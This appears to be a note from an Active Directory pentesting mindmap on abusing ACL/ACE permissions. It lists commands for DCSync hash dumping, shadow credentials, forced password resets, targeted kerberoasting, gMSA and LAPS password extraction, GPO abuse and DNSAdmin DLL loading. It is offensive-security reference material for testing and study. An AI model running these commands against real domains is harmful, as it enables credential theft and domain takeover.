---
title: "ACLs & ACEs Permissions"
category: acl
color: "#0050EF"
tags:
  - ad-mindmap
  - acl
  - cve
---

# 🧬 ACLs & ACEs Permissions

> [!info] Mindmap box `ACLs/ACEs permissions`
> Part of the [[AD Mindmap]] — Active Directory Mindmap v2025.03.

## Dcsync
➡️ [[Domain Admin|Domain Admin]] / [[Lateral Movement|Lateral move]] / [[Crack Hash|Crack hash]]

- Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts
- `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator` [↗](https://github.com/gentilkiwi/mimikatz)
- `secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'` [↗](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

## can change msDS-KeyCredentialLInk (Generic Write) + ADCS
➡️ [[Lateral Movement|PassTheCertificate]]

- Shadow Credentials
    - `certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'` [↗](https://github.com/ly4k/Certipy)
    - `pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"` [↗](https://github.com/ShutdownRepo/pywhisker)

## On Group

- GenericAll/GenericWrite/Self/Add Extended Rights
    - Add member to the group
- Write Owner
    - Grant Ownership
- WriteDACL + WriteOwner
    - Grant rights
        - Give yourself generic all

## On Computer

- GenericAll / GenericWrite
    - msDs-AllowedToActOnBehalf ➡️ [[Kerberos Delegation|RBCD]]
    - add Key Credentials ➡️ [[ACLs & ACEs Permissions|shadow credentials]]

## On User

- GenericAll / GenericWrite
    - Change password
        - `net user <user> <password> /domain` ➡️ [[Valid Credentials|User with clear text pass]]
    - add SPN (target kerberoasting)
        - `targetedKerberoast.py -d <domain> -u <user> -p <pass>` [↗](https://github.com/ShutdownRepo/targetedKerberoast) ➡️ [[Crack Hash|Hash found (TGS)]]
    - add key credentials ➡️ [[ACLs & ACEs Permissions|shadow credentials]]
    - login script ➡️ **Access**
- ForceChangePassword
    - `net user <user> <password> /domain` ➡️ [[Valid Credentials|User with clear text pass]]

## On OU

- Write Dacl
    - ACE Inheritance
        - Grant rights
- GenericAll / GenericWrite / Manage Group Policy Links
    - `OUned.py --config config.ini` [↗](https://github.com/synacktiv/OUned)

## ReadGMSAPassword

- `gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'` [↗](https://github.com/micahvandeusen/gMSADumper)
- `nxc ldap <ip> -u <user> -p <pass> --gmsa` [↗](https://github.com/Pennyw0rth/NetExec)
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa` [↗](https://github.com/franc-pentest/ldeep)

## Get LAPS passwords

- Who can read LAPS
    - `MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p` [↗](https://github.com/SpecterOps/BloodHound)
- Read LAPS ➡️ [[Admin Access|Admin]]
    - `Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize` [↗](https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword?view=windowsserver2025-ps)
    - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps` [↗](https://github.com/franc-pentest/ldeep)
    - `foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`
    - `nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps` [↗](https://github.com/Pennyw0rth/NetExec)
    - `msf> use post/windows/gather/credentials/enum_laps` [↗](https://docs.metasploit.com/)

## GPO

- Who can control GPOs
    - `MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p` [↗](https://github.com/SpecterOps/BloodHound)
- SID of principals that can create new GPOs in the domain
    - `Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs  | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl` [↗](https://github.com/PowerShellMafia/PowerSploit)
- Return the principals that can write to the GP-Link attribute on OUs
    - `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl` [↗](https://github.com/PowerShellMafia/PowerSploit)
- Generic Write on  GPO
    - Abuse GPO ➡️ **ACCESS**

## DNS Admin

- DNSadmins abuse (CVE-2021-40469) `#CVE` ➡️ [[Admin Access|Admin]]
    - `dnscmd.exe /config /serverlevelplugindll <\\path\to\dll> # need a dnsadmin user` [↗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
    - `sc \\DNSServer stop dns sc \\DNSServer start dns` [↗](https://learn.microsoft.com/en-us/windows/win32/services/controlling-a-service-using-sc)
